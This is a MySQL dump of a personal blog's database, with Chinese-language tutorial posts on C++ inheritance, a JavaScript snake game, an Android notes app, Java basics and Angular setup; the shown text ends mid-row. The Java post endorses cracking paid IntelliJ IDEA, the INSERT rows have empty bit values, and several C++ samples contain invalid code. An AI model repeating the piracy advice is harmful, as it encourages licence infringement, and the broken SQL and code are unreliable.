#
MySQL-Front 3.2  (Build 10.33)

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES */;

/*!40101 SET NAMES utf8 */;
/*!40103 SET TIME_ZONE='SYSTEM' */;

#
Host: 127.0.0.1    Database: blog
# ------------------------------------------------------
# Server version 5.0.67-community-nt



#
# Table structure for table hibernate_sequence
#

DROP TABLE IF EXISTS `hibernate_sequence`;
CREATE TABLE `hibernate_sequence`
(
    `next_val` bigint(20) default NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table hibernate_sequence
#

INSERT INTO `hibernate_sequence` VALUES (93);
INSERT INTO `hibernate_sequence`
VALUES (93);
INSERT INTO `hibernate_sequence`
VALUES (93);
INSERT INTO `hibernate_sequence`
VALUES (93);
INSERT INTO `hibernate_sequence`
VALUES (93);



#
# Table structure for table t_blog
#

DROP TABLE IF EXISTS `t_blog`;
CREATE TABLE `t_blog`
(
    `id`           bigint(20) NOT NULL,
    `appreciation` bit(1) NOT NULL,
    `comment`      bit(1) NOT NULL,
    `content`      longtext,
    `create_time`  datetime     default NULL,
    `firstpicture` varchar(255) default NULL,
    `flag`         varchar(255) default NULL,
    `published`    bit(1) NOT NULL,
    `recommend`    bit(1) NOT NULL,
    `shared`       bit(1) NOT NULL,
    `title`        varchar(255) default NULL,
    `update_time`  datetime     default NULL,
    `views`        int(11) default NULL,
    `type_id`      bigint(20) default NULL,
    `user_id`      bigint(20) default NULL,
    `description`  varchar(255) default NULL,
    `good`         int(11) default NULL,
    PRIMARY KEY (`id`),
    KEY            `FK292449gwg5yf7ocdlmswv9w4j` (`type_id`),
    KEY            `FK8ky5rrsxh01nkhctmo7d48p82` (`user_id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8;

#
# Dumping data for table t_blog  ???????? 使用复制的方式来添加
#





INSERT INTO `t_blog` VALUES (80,,,'# C++ 继承\r\n 以下简单的介绍C++的三大继承方式, 根据三种不同继承的方式, 可以总结成下面的一句话:\r\n **继承的时候，父类的成员将被放到子类的对应位置**\r\n## 公有继承 class A : public B\r\n 这可能是使用最多的一种继承方式，来看下面的一个简单的实例：\r\n\r\n**母类 Person**\r\n```C++\r\nclass Person {\r\n	private: int age;\r\n	protected: string name;\r\n	public: string city;\r\n	public:\r\n		Person(); //构造函数\r\n		Person(string nom); // 自定义的构造函数\r\n		virtual ~Person(); // 虚析构函数(解决内存的泄露)\r\n		void play();\r\n};\r\n```\r\n**子类 Worker**\r\n```C++\r\nclass Worker : public Person {\r\n	// ****\r\n};\r\n```\r\n解释如下：\r\n* 针对母类的3种类型的属性：\r\n  * private私有属性: 只有自身的函数可以访问，类的实例对象以及其继承子类不可见\r\n  * protected保护属性: 自身的函数可以访问，类的实例对象不可见，被子类3种继承后均可以被访问\r\n  * public公有属性: 自身的函数可以访问，类的实例对象也能访问到，被子类3种方式继承后均可以被访问\r\n  \r\n* 针对子类在public共有继承之后：\r\n	* 原母类的private私有属性不可见(只隐含存在)\r\n	* 原母类的protected保护属性被置于子类的protected保护属性下使用\r\n	* 原母类的public公有属性被置于子类的public共有属性下使用\r\n \r\n## 保护继承 class A : protected B\r\n**子类 Worker**\r\n```C++\r\nclass Worker : protected Person {\r\n	// ****\r\n};\r\n```\r\n解释如下：\r\n* 针对子类在protected保护继承之后：\r\n * 原母类的private私有属性不可见(只隐含存在)\r\n * 原母类的protected保护属性被置于子类的protected保护属性下使用\r\n * 原母类的public公有属性被置于子类的protected保护属性下使用\r\n\r\n## 私有继承 class A : private B\r\n**子类 Worker**\r\n```C++\r\nclass Worker : private Person {\r\n	// ****\r\n};\r\n```\r\n解释如下：\r\n* 针对子类在private私有继承之后：\r\n * 原母类的private私有属性不可见(只隐含存在)\r\n * 原母类的protected保护属性被置于子类的private私有属性下使用\r\n * 原母类的public公有属性被置于子类的private私有属性下使用\r\n \r\n## 函数的隐藏 \r\n**父子类含有同名的函数时，父类里的函数将会被隐藏**\r\n关键看函数名称是否相同, 即使参数不同也会形成隐藏, 而不会出现重载重定义函数的现象。\r\n来看下面的一个小实例：\r\n```C++\r\nClass Person { \r\n   protected: string name; string code；\r\n   public : \r\n       void play(); \r\n};\r\nClass Soldier: public Person { \r\n      protected: int code;\r\n      public : \r\n	      void play(); \r\n	      void work(); \r\n};\r\nInt Soldier::work(){\r\n     Person::code=\"12\"; // 调用到父类隐藏的成员变量\r\n}\r\nInt main(void){\r\n      Soldier soldier;\r\n      Soldier.play(); //直接会调用到子类的函数\r\n      Soldier.Person::play(); // 调用到父类隐藏的函数\r\n      Return 0;\r\n}\r\n```\r\n## Is-A <是一个>的关系\r\n* Void fun1(Person *p){...} 指针 === void fun2(Person &p){...} 引用 (不会实例化对象 不产生临时变量)    \r\n* void fun3(Person p){...}  参数传入时，产生<<临时变量>>使用后会被销毁掉\r\n* 使用父类指向子类的实例化对象，该指针可以调用到父类的函数, 称之为**上行转换**, 反之则需要使用强制转换\r\n* 父类只接受对应的定义数据成员，无法赋值到子类另外定义的数据成员，用子类对父类进行赋值，父类只取对应的数据成员赋值\r\n\r\n## 多继承\r\n\r\n* 多重继承\r\n\r\n  执行了多次重复的继承，实例化时候依次执行构造函数，销毁时反之\r\n```C++\r\n  Class A {};    \r\n  class B : public A { };  \r\n  class C : public B {};\r\n```\r\n\r\n* 多继承 (C++允许一个类同时继承多个父类)\r\n\r\n```C++\r\n	Class Worker {}; \r\n	Class Farmer {};\r\n	Class WorkerFermar : public Worker, public Farmer {};\r\n	//特殊的构造函数的赋值 \r\n	WorkerFermar::WorkerFermar(string name,sting code):Worker(name),Farmer(code){ }  \r\nInt main(void){\r\n    //利用定义的构造函数进行初始化\r\n	WorkerFermar *p = new WorkerFermar(\"chen tong\", \"002\");\r\n	Return 0;\r\n}\r\n```\r\n\r\n## 虚继承 virtual\r\n\r\n解决菱形继承, 避免子类的子类重复继承包含相同的父类信息\r\n\r\n```C++\r\nClass Worker : virtual public Person { };\r\n\r\nClass fermer : virtual public Person { };\r\n\r\nClass WorkerFermer : public Worker, public Fermer { };\r\n```\r\n\r\n# C++ 多态\r\n指相同对象收到不同消息或不同对象收到形同消息时产生的不同状态\r\n## 静态多态(早绑定)\r\n互为重载的两个函数 根据参数来决定调用\r\n```C++\r\nClass Rect { \r\n   Public:\r\n      Int caclArea ( int width );\r\n      Int caclArea ( int width, int height );\r\n}\r\n```\r\n## 动态多态(晚绑定)\r\n\r\n* 虚函数 virtual: 父类的函数添加关键字virtual, 使之成为虚函数==>可以被子类重新定义使用\r\n\r\n* 虚函数表\r\n  * 使用虚函数后,对应实例化对象时, 通过虚函数表对应找到的对应函数的函数指针的地址将会与父类函数指针的地址不同(对应出的内存的地址不同,体现了多态性), 这样在使用时明显区分子类父类的成员函数变化性\r\n  \r\n## 函数的覆盖\r\n\r\n* 如果在子类里没有定义同名的虚函数, 那么在子类里将会用父类的虚函数地址(函数指针)，反之, 在子类的虚函数表中，则会把原来的父类的虚函数的地址覆盖成子类的虚函数地址\r\n\r\n## 纯虚函数 \r\n```C++\r\nClass Shape {\r\n	Public : \r\n		Virtual double caclArea(){ return 0};\r\n		Virtual double caclA() = 0;\r\n}\r\n```\r\n## 抽象类\r\n无法实例化对象, 含有纯虚函数的类, 在子类中一步一步实例化对象，当把全部的纯虚函数都做了实例化以后才能实例对象\r\n\r\n## 接口类 (表达一种能力或者协议)\r\n* 没有构造函数和析构函数: 只含有成员函数，且成员函数都是纯虚函数\r\n\r\n```C++\r\nClass Fly {\r\n	Public : \r\n   		Virtual void takeoff() = 0;\r\n   		Virtual void land() = 0;\r\n}\r\n```\r\n','2018-11-23 23:55:56','/images/blog1.jpg','原创',,,,'C++初级教程','2018-11-29 22:40:43',16,15,1,'C++，可谓是当今主流的几大编程语言之一。这篇博客我将介绍C++的2个核心技术：继承和多态。如果你有一定编程基础，通过此篇文章的学习，相信能更加全面的了解C++的重点',2);
INSERT INTO `t_blog`
VALUES (82, , ,
        '贪吃蛇游戏相信大家都玩过，但你有没有想过这款游戏是如何开发出来的? 下面我将详细的介绍游戏基本的开发逻辑，主要分为三个部分\r\n* 游戏的基本属性\r\n* 游戏的功能实现函数\r\n* 游戏的运行\r\n\r\n# 游戏的基本属性\r\n首先需要定义几个游戏的属性变量，来控制游戏的状态，得分，运行方向等等，设置如下：\r\n```javascript\r\nvar canvas = document.getElementById(\'canvas\'); // 获取到页面的标签\r\nvar ctx = canvas.getContext(\'2d\'); // 获取2d的文档区的空间\r\nvar status = false; // 游戏的状态\r\nvar score = 0; // 游戏的得分\r\nvar old_direction = \'right\'; // 初始化之前移动的方向\r\nvar dircetion = \'right\';  // 初始化现在运行的方向\r\nvar block = 10; // 划分的block的节点的单位大小，蛇的一个节点所占的大小\r\nvar refresh_rate = 250; // 刷新渲染蛇的速率，没吃到食物后速度提高\r\nvar pos = [[5,1],[4,1],[3,1],[2,1],[1,1]]; // 蛇的初始位置及几个单位长度\r\n// 设置按键Key值控制的移动方向\r\nvar keys = { 37 : \'left\', 38 : \'up\',  39 : \'right\',  40 : \'down\'  }; \r\n// 首先初始化一个食物的位置\r\nvar food = [ Math.round(Math.random(4)*(canvas.width-10)), Math.round(Math.random(4)*(canvas.height-10)) ];\r\n```\r\n\r\n# 游戏的功能实现函数\r\n下面介绍游戏的几个核心功能的实现\r\n## 1.食物的生成和填充\r\n```javascript\r\n// 随机自动生成食物的节点 food\r\nfunction createfood(){		       \r\n	food = [Math.round(Math.random(4)*850), Math.round(Math.random(4)*600)]; \r\n}\r\n// 填充10*10大小的像素点 作为食物\r\nfunction feed(){\r\n	ctx.beginPath();\r\n	ctx.fillStyle = \"#ff0000\";\r\n	ctx.fillRect(food[0],food[1],10,10); \r\n	ctx.fill();\r\n	ctx.closePath();\r\n}  \r\n```\r\n## 2.蛇的渲染绘制\r\n```javascript\r\n// 给蛇的初始生命\r\nfunction giveLife(){\r\n	var nextPosition = pos[0].slice();\r\n	switch(old_direction){\r\n		case \'right\': nextPosition[0] += 1; break;\r\n		case \'left\' : nextPosition[0] -= 1; break;\r\n		case \'up\' : nextPosition[1] -= 1; break;\r\n		case \'down\' : nextPosition[1] += 1; break;\r\n	}\r\n	pos.unshift(nextPosition); // 刷新位置坐标\r\n	pos.pop();\r\n}\r\n// 蛇的渲染函数，依次绘制蛇的每一个节点\r\nfunction todraw(){\r\n	for(var i=0; i< pos.length; i++){ draw(pos[i]); }\r\n}	   	\r\nfunction draw(pos){\r\n	var x = pos[0] * block;\r\n	var y = pos[1] * block;\r\n	// 游戏结果状况判断\r\n	if(x>=canvas.width || x<=0 || y>=canvas.height || y<=0){\r\n		document.getElementById(\'pause\').disabled=\'true\'; // 暂停游戏\r\n		snake.game.status=false; // 结束游戏的状态\r\n		ctx.clearRect(0,0,canvas.width,canvas.height); // 清除掉文本的信息内容\r\n		ctx.font=\'40px san-serif\';\r\n		ctx.fillText(\'Game Over\',300,250); \r\n		ctx.font=\'20px san-serif\';\r\n		ctx.fillstyle=\'#ffaa80\';\r\n		ctx.fillText(\'Refresh the page or click the restart button to play again\',200,300);\r\n		throw(\'Game Over\');\r\n}else if(score > 5000) {\r\n		document.getElementById(\'pause\').disabled=\'true\'; // 暂停掉游戏\r\n		snake.game.status=false; // 结束游戏的状态\r\n		ctx.clearRect(0,0,canvas.width,canvas.height); // 清除掉文本的信息内容\r\n		ctx.font=\'30px san-serif\';\r\n		ctx.fillText(\'Congratuations,
        You win this game!\',250,250); \r\n		throw(\'Congratuations\');\r\n}else{\r\n		ctx.beginPath();\r\n		ctx.fillStyle =\'#ffaa80\';\r\n		ctx.fillRect(x,y,block,block);\r\n		ctx.closePath();\r\n	}\r\n}\r\n```\r\n## 3.游戏的循环函数\r\n```javascript\r\n// 游戏的主要循环函数\r\nfunction loop(){\r\n	ctx.clearRect(0,0,canvas.width,canvas.height);\r\n	todraw(); \r\n	giveLife(); \r\n	feed(); \r\n	if(is_catched(pos[0][0]*block,pos[0][1]*block,block,block, food[0],food[1],10,10)){\r\n		score += 10;\r\n		createfood();\r\n		document.getElementById(\'scroeboard\').innerHTML = score;\r\n		grow(); // 吃到食物后变长，同时速度提高\r\n		if(refresh_rate > 100){\r\n			refresh_rate -= 5;\r\n		}\r\n	}\r\n	snake.game.status = setTimeout(function(){loop();},refresh_rate);\r\n}\r\n```\r\n## 4.获取食物\r\n```javascript\r\n// 游戏获取到食物判断。判断蛇头与食物是否有位置的接触\r\nfunction is_catched(ax, ay, awidth, aheight, bx, by, bwidth, bheight){\r\n	return !( ((ay+aheight)<(by)) || (ay>(by+bheight)) || ((ax+awidth)<bx) || (ax>(bx+bwidth)) );\r\n}\r\n// 获取食物像素点后的变长, 根据首点的位置与方向确定在那个方向上添加\r\nfunction grow(){			    	     \r\n	var nextposition = pos[0].slice(); // 返回一个新的数组\r\n	switch(old_direction){\r\n		case \'right\': nextposition[0] += 1; break;\r\n		case \'left\' : nextposition[0] -= 1; break;\r\n		case \'up\' : nextposition[1] += 1; break;\r\n		case \'down\': nextposition[1] -= 1; break;\r\n	}\r\n	pos.unshift(nextposition);\r\n} \r\n```\r\n\r\n# 游戏的运行\r\n在完成以上基础功能的实现后，现在开始游戏的运行\r\n## 1.响应键盘按键的输入KEY值\r\n```javascript\r\n// 根据按键的输入 控制页面的事件event \r\nwindow.onkeydown = function(event){\r\n	direction = keys[event.keyCode];\r\n	// 只响应对应的非空的四个方向上的按键，蛇前进的方向不可以倒退\r\n	if(direction){\r\n		switch(direction){\r\n			case \'left\' :\r\n				if(old_direction != \'right\'){\r\n					old_direction = direction;\r\n				}\r\n				break;\r\n			case \'right\' : \r\n				if(old_direction != \'left\'){\r\n					old_direction = direction;\r\n				}\r\n				break;\r\n			case \'up\' :\r\n				if(old_direction != \'down\'){\r\n					old_direction = direction;\r\n				}\r\n				break;\r\n			case \'down\' :\r\n				if(old_direction != \'up\'){\r\n					old_direction = direction;\r\n				}\r\n				break;\r\n		}\r\n		event.preventDefault();\r\n	}\r\n};\r\n```\r\n## 2.启动，暂停，重新开始\r\n```javascript\r\n// 启动和暂停可共用一个函数\r\nfunction pause(element){\r\n	if(snake.game.status){\r\n		clearTimeout(snake.game.status);\r\n		snake.game.status = false;\r\n		element.value = \'Play\';\r\n	}else{\r\n		loop();\r\n		element.value = \'Pause\';\r\n	}\r\n}\r\n//控制页面的重新加载函数 \r\nfunction restart(){\r\n	location.reload(); \r\n}\r\n```\r\n## 3.页面测试\r\n最后一步是在页面添加几个标签，来实现页面的效果\r\n```html\r\n<canvas width=\"850\" height=\"600\" id=\"canvas\" style=\"background:#ffffb3; margin-top:50px; margin-left:100px; border:2px solid #9999ff;\"></canvas>   \r\n<div id=\"controls\" style=\"float:right; text-align:center; margin-right: 420px; margin-top: 100px;\">\r\n	<div style=\"font-size:30px; color: red;\">  \r\n	   score : <span id=\"scroeboard\"> </span> \r\n	</div>\r\n   <input type=\"button\" id=\"pause\" value=\"Play\" onclick=\"snake.game.pause(this);\" accesskey=\"p\" /> \r\n   <input type=\"button\" id=\"restart\" value=\"Reatart\" onclick=\"snake.game.restart();\" /> \r\n</div>\r\n```\r\n\r\n\r\n**以上就是主要功能的实现，主要是提供开发的思路**\r\n',
        '2018-11-25 22:58:54', '/images/blog3.jpg', '原创', , , , 'JS开发网页版贪吃蛇游戏', '2018-11-29 23:06:35', 21, 58, 1,
        'JavaScript最受欢迎的编程语言之一，包含丰富的库和框架，拥有众多强大的功能值得你去探索。这篇博客我将会给你介绍: 如何使用200行代码实现一款简单的网页版贪吃蛇游戏', 0);
INSERT INTO `t_blog`
VALUES (83, , ,
        '在开发之前，需要完成以下三个方面 (如果你对AS有一定的了解，那么请直接忽略)：\r\n- 配置电脑的java开发环境和JDK\r\n- 下载并安装Android Studio\r\n- 了解Android Studio的基本组件和界面\r\n\r\n**关于以上的内容可以在网上找到很多的资料，我不在此赘述，如果有任何问题可以在我的博客下面留言，下面直接开始开发**\r\n\r\n# 主界面的开发(内容的显示界面)\r\n\r\n## 1.显示界面的设置\r\n直接在界面中拖入组件listview或者是RecycleView(这个我将在后面的APP制作中介绍)。listview用来显示记事本的每一条信息，用字符串的形式显示\r\n```xml\r\n<ListView\r\n	android:id=\"@+id/listview\"\r\n	android:layout_width=\"368dp\"\r\n	android:layout_height=\"551dp\"\r\n	android:layout_marginBottom=\"8dp\"\r\n	android:layout_marginEnd=\"8dp\"\r\n	android:layout_marginLeft=\"8dp\"\r\n	android:layout_marginRight=\"8dp\"\r\n	android:layout_marginStart=\"8dp\"\r\n	android:layout_marginTop=\"32dp\"\r\n	app:layout_constraintBottom_toBottomOf=\"parent\"\r\n	app:layout_constraintEnd_toEndOf=\"parent\"\r\n	app:layout_constraintStart_toStartOf=\"parent\"\r\n	app:layout_constraintTop_toTopOf=\"parent\" />\r\n```\r\n## 2.界面功能实现\r\n在MainActivity中拿到界面的组件，并作基本的设置：\r\n- 点击每一行跳转到次界面\r\n- 长按每一行弹出Alert操作信息: 修改或者删除信息\r\n\r\n```java\r\n// 获取到界面的组件\r\nprivate ListView listView;\r\npublic static ArrayList<String> notesList;\r\npublic static ArrayAdapter arrayAdapter;\r\n\r\nprivate HashSet<String> set;\r\nprivate SharedPreferences sharedPreferences;\r\n\r\n@Override\r\nprotected void onCreate(Bundle savedInstanceState) {\r\n	super.onCreate(savedInstanceState);\r\n	setContentView(R.layout.activity_main);\r\n	// 使用SharedPreferences来完成数据的永久保存\r\n	sharedPreferences = getApplicationContext().getSharedPreferences(\"com.example.chentong.appnotes\", Context.MODE_PRIVATE);\r\n	set = (HashSet<String>) sharedPreferences.getStringSet(\"notes\", null);\r\n	if(set == null){\r\n    	notesList = new ArrayList<String>();\r\n    	notesList.add(\"example notes ?\");\r\n  	} else {\r\n        notesList = new ArrayList(set);\r\n   	}\r\n	// List列表的配置\r\n	listView = findViewById(R.id.listview);\r\n	arrayAdapter = new ArrayAdapter(this, android.R.layout.simple_list_item_1, notesList);\r\n	listView.setAdapter(arrayAdapter);\r\n    // 跳转到次界面\r\n	listView.setOnItemClickListener(new AdapterView.OnItemClickListener() {\r\n     	@Override\r\n		public void onItemClick(AdapterView<?> parent, View view, int position, long id) {\r\n      	Intent intentActivity = new Intent(getApplicationContext(), NoteEditorActivity.class);\r\n      	intentActivity.putExtra(\"noteID\", position);\r\n      	startActivity(intentActivity);\r\n     }\r\n   });\r\n	listView.setOnItemLongClickListener(new AdapterView.OnItemLongClickListener() {\r\n		@Override\r\n		public boolean onItemLongClick(AdapterView<?> parent, View view, final int position, long id) {\r\n            new AlertDialog.Builder(MainActivity.this)\r\n                .setIcon(android.R.drawable.ic_dialog_alert)\r\n                .setTitle(\"Delete ?\")\r\n                .setMessage(\"Do you want to delete this ?\")\r\n                .setPositiveButton(\"Yes\", new DialogInterface.OnClickListener() {\r\n                    @Override\r\n                    public void onClick(DialogInterface dialog, int which) {\r\n                        notesList.remove(position);\r\n                        arrayAdapter.notifyDataSetChanged();\r\n                        HashSet<String> set = new HashSet<>(MainActivity.notesList);\r\n                        sharedPreferences.edit().putStringSet(\"notes\", set).apply();\r\n                    }\r\n                })\r\n                .setNegativeButton(\"No\", new DialogInterface.OnClickListener() {\r\n                    @Override\r\n                    public void onClick(DialogInterface dialog, int which) {\r\n                        System.out.println(\"do nothing\");\r\n                    }\r\n                }).show();\r\n            return true; \r\n            }\r\n        });\r\n}\r\n```\r\n# 次界面的开发(内容的编辑界面)\r\n该界面用来编辑记事本的每一行的内容，例如修改原来的内容或者添加新的内容\r\n## 1.显示界面的设置\r\n```xml\r\n<EditText\r\n        android:id=\"@+id/editText\"\r\n        android:layout_width=\"366dp\"\r\n        android:layout_height=\"61dp\"\r\n        android:layout_marginEnd=\"8dp\"\r\n        android:layout_marginLeft=\"8dp\"\r\n        android:layout_marginRight=\"8dp\"\r\n        android:layout_marginStart=\"8dp\"\r\n        android:ems=\"10\"\r\n        android:inputType=\"textPersonName\"\r\n        android:text=\"note\"\r\n        app:layout_constraintBottom_toBottomOf=\"parent\"\r\n        app:layout_constraintEnd_toEndOf=\"parent\"\r\n        app:layout_constraintStart_toStartOf=\"parent\"\r\n        app:layout_constraintTop_toTopOf=\"parent\"\r\n        app:layout_constraintVertical_bias=\"0.065\" />\r\n\r\n    <Button\r\n        android:id=\"@+id/button\"\r\n        android:layout_width=\"269dp\"\r\n        android:layout_height=\"wrap_content\"\r\n        android:layout_marginTop=\"20dp\"\r\n        android:background=\"@android:color/holo_green_light\"\r\n        android:onClick=\"backButton\"\r\n        android:text=\"Submit\"\r\n        app:layout_constraintEnd_toEndOf=\"parent\"\r\n        app:layout_constraintHorizontal_bias=\"0.504\"\r\n        app:layout_constraintStart_toStartOf=\"parent\"\r\n        app:layout_constraintTop_toBottomOf=\"@+id/editText\" />\r\n```\r\n## 2.界面功能实现\r\n\r\n```java\r\nprivate EditText editText;\r\nprivate int noteId;\r\nprivate SharedPreferences sharedPreferences;\r\n\r\n@Override\r\nprotected void onCreate(Bundle savedInstanceState) {\r\n	super.onCreate(savedInstanceState);\r\n	setContentView(R.layout.activity_note_editor);\r\n	sharedPreferences = getApplicationContext().getSharedPreferences(\"com.example.chentong.appnotes\", Context.MODE_PRIVATE);\r\n	editText = findViewById(R.id.editText);\r\n	Intent intent = getIntent();\r\n	noteId = intent.getIntExtra(\"noteID\", -1); // set the default value\r\n	if(noteId != -1){ editText.setText(MainActivity.notesList.get(noteId));\r\n    } else { editText.setText(\"\"); }\r\n    // 编辑框的检测函数Listener\r\n	editText.addTextChangedListener(new TextWatcher() {\r\n	@Override\r\n	public void beforeTextChanged(CharSequence s, int start, int count, int after) {}\r\n	@Override\r\n	public void onTextChanged(CharSequence s, int start, int before, int count) {}\r\n	@Override public void afterTextChanged(Editable s) {}\r\n	});\r\n}\r\n\r\n//完成编辑后返回到首界面，添加数据到List记事本列表，同时保存\r\npublic void backButton(View view){\r\n	// Update the value, or add a new value in the list\r\n	if(noteId == -1) {\r\n      	MainActivity.notesList.add(String.valueOf(editText.getText()));\r\n	} else {\r\n     	 MainActivity.notesList.set(noteId, String.valueOf(editText.getText()));\r\n	}\r\n	MainActivity.arrayAdapter.notifyDataSetChanged();\r\n	HashSet<String> set = new HashSet<>(MainActivity.notesList);\r\n	sharedPreferences.edit().putStringSet(\"notes\", set).apply();\r\n	finish();\r\n}\r\n```\r\n\r\n# 菜单界面(界面的切换)\r\n在首界面的右上角添加一个按钮菜单menu来实现界面的切换功能\r\n在/res下新建一个/menu目录，里面新建一个文件meun_bar.xml,并在xml文件中添加item\r\n\r\n```xml\r\n<item android:title=\"Add Agenda\" android:id=\"@+id/add\" />\r\n```\r\n返回MainActivity添加两个功能函数，实现menu菜单的功能\r\n```java\r\n@Override\r\npublic boolean onCreateOptionsMenu(Menu menu) {\r\n	MenuInflater menuInflater = getMenuInflater();\r\n	menuInflater.inflate(R.menu.menu_bar, menu);\r\n	return super.onCreateOptionsMenu(menu);\r\n}\r\n\r\n@Override\r\npublic boolean onOptionsItemSelected(MenuItem item) {\r\n	super.onOptionsItemSelected(item);\r\n	switch (item.getItemId()) {\r\n		case R.id.add:\r\n			Log.i(\"Item selected\", \"add item\");\r\n			Intent intentMenu = new Intent(getApplicationContext(), NoteEditorActivity.class);\r\n			startActivity(intentMenu);\r\n			return true;\r\n		default:\r\n			return false;\r\n	}\r\n}\r\n```\r\n\r\n**至此，完成了所有的功能, 完成开发之后你可以将该APP生成APK文件安装到你的安卓手机中，是不是很简单呢** ',
        '2018-11-26 00:08:15', '/images/blog2.jpg', '连载', , , , 'Android开发一款记事本APP', '2018-11-29 22:59:16', 5, 57, 1,
        'Android系统系列的博客我将会介绍不同的安卓APP的制作过程，从简单的基础组件到复杂功能的实现，带你一步步的打开安卓世界的大门。第一个APP教程我将会介绍一个比较有代表性的安卓入门APP的制作', 1);
INSERT INTO `t_blog`
VALUES (84, , ,
        '# 1. 前期准备\r\n## 1.1 集成开发环境IDE\r\n下面我推荐4款java集成开发环境，每款我都使用过，都是顶级的IDE\r\n- **IDEA** : 目前炙手可热的IDE，也是我开发这个个人网站所使用的开发环境\r\n- **Eclipse** ：由IBM开发的IDE, 拥有很多强大的功能\r\n- **NetBeans** ：顶级的Java开发工具\r\n- **Visual Studio** ：号称是宇宙最强IDE，VS在2019版之后据说是开始支持Java语言的开发\r\n\r\n所有的IDE均可到官方网站下载，其中**IDEA**是付费的软件，网上有破解的方法，我测试过，破解之后可以使用100年左右。\r\n## 1.2 学习资料\r\n关于学习的资料，主要有两种方式：\r\n- 网上视频课程，推荐**极客学院**\r\n- 网上的资料书，推荐一本：**Java从入门到精通(第四版) 明日科技**\r\n\r\n## 1.3 电脑环境配置\r\n关于电脑的环境配置，每一个视频教程或者网上资料书都会介绍，简单的说就是安装电脑的java开发环境，jre等。\r\n\r\n# 2.重点核心\r\n在这一部分我会简单的介绍java语言的一些重点和难点。都是个人的经验，方便大家留意\r\n## 2.1 类与对象\r\nJava作为一个面向对象的语言，其中重点便是类和对象\r\n1. 类是统一事物的统称。对象则是符合某个类所产生出来的实例\r\n2. 面向对象的3大特点：封装，继承，多态\r\n3. 理解类中的成员变量和成员方法\r\n4. 理解对象的创建，属性行为，销毁\r\n\r\n下面是一个类的简单实例：\r\n```java\r\npublic class User {\r\n    private long id;\r\n    private String nickname;\r\n    private String username; \r\n   \r\n    public User() {}\r\n    public long getId() { return id; }\r\n    public void setId(long id) { this.id = id; }\r\n    public String getNickname() { return nickname; }\r\n    public void setNickname(String nickname) { this.nickname = nickname;}\r\n    public String getUsername() { return username; }\r\n    public void setUsername(String username) { this.username = username;}\r\n}\r\n```\r\n\r\n## 2.2 接口，继承，多态\r\n**Java语言只支持单继承，不支持多继承，即一个类只能继承一个父类。**\r\n通过接口来实现java语言的多继承的功能。\r\n- 接口的定义和实现\r\n\r\n```java\r\npublic interface UserService {\r\n    // 定义接口中的方法\r\n    User checkUser(String username, String password);\r\n}\r\n// 在类中实现checkUser方法的具体功能\r\npublic class UserServiceImpl implements UserService {\r\n    @Override\r\n    public User checkUser(String username, String password) {\r\n        // Do something \r\n        return user;\r\n    }\r\n}\r\n```\r\n- java类的继承和继承中的重写\r\n- java的多态：通常使用方法的重载(Overloading)和重写(Overriding)来说实现类的多态性\r\n来看下面一个简单的实例：\r\n```java\r\npublic class Calculate {\r\n final float p = 3.14f;\r\n // 求圆形的面积\r\n public float getArea(float r) {\r\n    float area = p*r*r;\r\n	return area;\r\n }\r\n // 重载getArea()方法\r\n public float getArea(float l, float w) {\r\n    float area = l*w;\r\n	return area;\r\n }\r\n}\r\n```\r\n\r\n## 2.3 Java类的高级特性\r\n关于java类的高级特性里面主要有以下几点：\r\n- **java的抽象类**\r\n  所谓的抽象类，就是指不能被实例化的类。\r\n- **java的内部类**\r\n  顾名思义，就是在java的类中声明一个新的类，在某种条件下拥有强大的效果(例如：在android开发中对于组件RecycleView的内容加载，往往需要通过内部类来实现)\r\n```java\r\n  public class OuterClass { // 外部类\r\n     public class InnerClass { // 内部类\r\n	   // TO DO\r\n	 }\r\n  }\r\n```\r\n- **class类和Java反射原理**\r\n1. 所有的Java类均继承了Object类，在Object类中定义了一个getClass()方法，该方法返回的便是一个类型为class的对象\r\n2. Java的反射机制功能十分的强大，在java.lang.reflect包中提供了对于该功能的支持\r\n\r\n# 3. 总结认知\r\n对应java其他的知识，例如Java集合类，异常处理，输入流和输出流等等，你可以在网上找到很多的例子。我不在此赘述，博客主要提供学习的思路和方式。\r\n\r\n**如果你想学好任何一门编程语言，只有一种方式，就是多写代码多测试。希望你能根据教程的内容或者根据网上的资料书，一步一步的练习测试，便能慢慢的发现Java语言的强大和魅力之处。**\r\n\r\n**直到有一天，你会发现所有的编程语言都有着相通的逻辑，任何语言你都能在短时间内学会。**\r\n',
        '2018-11-26 16:55:56', '/images/blog4.jpg', '原创', , , , 'JAVA语言入门到精通', '2018-11-29 23:19:28', 14, 15, 1,
        'Java，2018年年度排名第一的编程语言，在所有语言( 超过100种 )中的占有率高达17%左右,  对于任何一个IT工作人员都应该是必备的技能，这篇博客我将介绍如何入门Java以及学习中的方法重点', 1);
INSERT INTO `t_blog`
VALUES (85, , ,
        '由于个人做过几个Angular的项目，对其有一定的了解，在这里分享一下入门的思路\r\n# Angular 入门\r\n- 开发环境配置\r\n1. 安装NodeJS，这个可以在官网直接下载\r\n2. 安装Angular CLI，推荐网站：https://angular.io/guide/quickstart\r\n\r\n如果你使用的是苹果电脑，那么可以执行如下指令：\r\n```\r\n>brew install node\r\n>sudo npm install -g @angular/cli\r\n```\r\n\r\n# Angular 实例项目\r\n下面介绍一个基础的，通过Angular构建的web网页\r\n## 1. 创建项目\r\n通过**ng new**来新建一个项目，进入项目目录，开启serve服务器，在浏览器输入以下网址 http://localhost:4200/ 如果构建成功，便能看到一个初始化的网页\r\n```\r\n>ng new Projet_nom --style=scss --routing \r\n>cd Projet_nom\r\n>ng serve\r\n```\r\n## 2. 创建component组件\r\n- 新建网页的组件，每个组件对应一个界面或者是界面的一个组件(可重复的利用)\r\n\r\n使用ng g component指令添加，会自动的将组件添加到项目app.module.ts文件中\r\n\r\n```\r\n//在components目录下面新建一个user的组件\r\n>ng g component components/user\r\n```\r\n- 新建网页的service服务部分，用来处理数据以及后端的服务功能\r\n\r\n```\r\n//Create a service \r\n> ng g service services/data\r\n```\r\n## 3. 